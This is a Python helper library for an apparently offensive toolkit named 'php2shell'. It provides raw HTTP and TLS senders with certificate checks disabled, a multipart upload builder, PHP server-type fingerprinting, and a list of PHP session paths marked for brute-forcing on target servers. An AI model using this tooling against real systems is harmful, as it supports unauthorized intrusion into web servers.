#!/usr/bin/env python3
"""
Shared library for php2shell exploits.
Provides network utilities and common functions.
"""

import socket
import ssl
from urllib.parse import urlparse
from typing import Optional, Tuple


def parse_target(target: str) -> Tuple[str, int, bool]:
    """Parse target URL into host, port, tls."""
    u = urlparse(target if target.startswith(('http://', 'https://')) else 'http://' + target)
    host = u.hostname
    port = u.port or (443 if u.scheme == 'https' else 80)
    tls = u.scheme == 'https'
    return host, port, tls


def send_raw(host: str, port: int, request: bytes, tls: bool = False,
             timeout: int = 30) -> Optional[bytes]:
    """Send raw HTTP request and return response."""
    try:
        sock = socket.create_connection((host, port), timeout=timeout)
        if tls:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            sock = ctx.wrap_socket(sock, server_hostname=host)
        sock.sendall(request)
        sock.settimeout(timeout)
        resp = b""
        while True:
            try:
                chunk = sock.recv(65536)
                if not chunk:
                    break
                resp += chunk
            except socket.timeout:
                break
        sock.close()
        return resp
    except Exception as e:
        return f"ERROR: {e}".encode()


def connect(host: str, port: int, tls: bool = False, timeout: int = 30) -> socket.socket:
    """Create and return a connected socket (for stalled connections)."""
    sock = socket.create_connection((host, port), timeout=timeout)
    if tls:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        sock = ctx.wrap_socket(sock, server_hostname=host)
    return sock


def build_multipart(boundary: str, fields: dict, files: dict = None) -> bytes:
    """Build multipart/form-data body."""
    parts = []
    
    for name, value in fields.items():
        parts.append(f"--{boundary}")
        parts.append(f'Content-Disposition: form-data; name="{name}"')
        parts.append("")
        parts.append(str(value))
    
    if files:
        for name, file_info in files.items():
            filename = file_info.get('filename', 'file')
            content_type = file_info.get('content_type', 'application/octet-stream')
            content = file_info.get('content', b'')
            
            parts.append(f"--{boundary}")
            parts.append(f'Content-Disposition: form-data; name="{name}"; filename="{filename}"')
            parts.append(f"Content-Type: {content_type}")
            parts.append("")
            if isinstance(content, bytes):
                parts.append(content.decode('latin-1', 'replace'))
            else:
                parts.append(str(content))
    
    parts.append(f"--{boundary}--")
    return "\r\n".join(parts).encode()


def send_http(host: str, port: int, method: str, path: str, tls: bool = False,
              headers: dict = None, body: bytes = b"",
              cookies: dict = None, timeout: int = 30) -> Optional[bytes]:
    """Send HTTP request with proper formatting."""
    hdrs = headers or {}
    if cookies:
        cookie_str = "; ".join(f"{k}={v}" for k, v in cookies.items())
        hdrs["Cookie"] = cookie_str
    if body:
        hdrs.setdefault("Content-Length", str(len(body)))
    hdrs.setdefault("Host", host)
    hdrs.setdefault("Connection", "close")
    hdrs.setdefault("User-Agent", "Mozilla/5.0 (compatible; php2shell/1.0)")

    req_lines = [f"{method} {path} HTTP/1.1"]
    req_lines.extend(f"{k}: {v}" for k, v in hdrs.items())
    request = "\r\n".join(req_lines).encode() + b"\r\n\r\n" + body
    return send_raw(host, port, request, tls, timeout)


# Common session paths for brute-forcing
COMMON_SESSION_PATHS = [
    "/tmp/sessions",
    "/tmp",
    "/var/lib/php/sessions",
    "/var/lib/php5/sessions",
    "/var/lib/php7/sessions",
    "/var/lib/php8/sessions",
    "/var/lib/php/8.0/sessions",
    "/var/lib/php/8.1/sessions",
    "/var/lib/php/8.2/sessions",
    "/var/lib/php/8.3/sessions",
    "/var/lib/php/8.4/sessions",
    "/var/lib/php/8.5/sessions",
    "/usr/local/php/var/lib/php/sessions",
    "/opt/php/var/lib/php/sessions",
    "/home/www/sessions",
    "/home/web/sessions",
    "/www/sessions",
    "/web/sessions",
    "/var/www/sessions",
    "/var/www/html/sessions",
    "/var/www/vhosts/sessions",
    "C:\\Windows\\Temp",
    "C:\\Temp",
    "C:\\php\\sessions",
    "C:\\xampp\\tmp",
    "C:\\wamp64\\tmp",
]


def detect_sapi(server_header: str, headers: dict) -> str:
    """Detect PHP SAPI from headers."""
    server_lower = server_header.lower()
    if "apache" in server_lower and "php" in server_lower:
        return "apache2handler"
    if "apache" in server_lower:
        return "apache"
    if "nginx" in server_lower or "litespeed" in server_lower:
        if "php" in headers.get("X-Powered-By", "").lower():
            return "fpm-fcgi"
    if "frankenphp" in server_lower:
        return "frankenphp"
    if "litespeed" in server_lower:
        return "litespeed"
    return "unknown"


if __name__ == "__main__":
    # Quick test
    import sys
    if len(sys.argv) > 1:
        target = sys.argv[1]
        host, port, tls = parse_target(target)
        print(f"Host: {host}, Port: {port}, TLS: {tls}")
        
        # Test connection
        resp = send_http(host, port, "GET", "/", tls)
        if resp:
            print(f"Response: {resp.split(b'\r\n', 1)[0].decode('latin-1', 'replace')}")
        else:
            print("No response")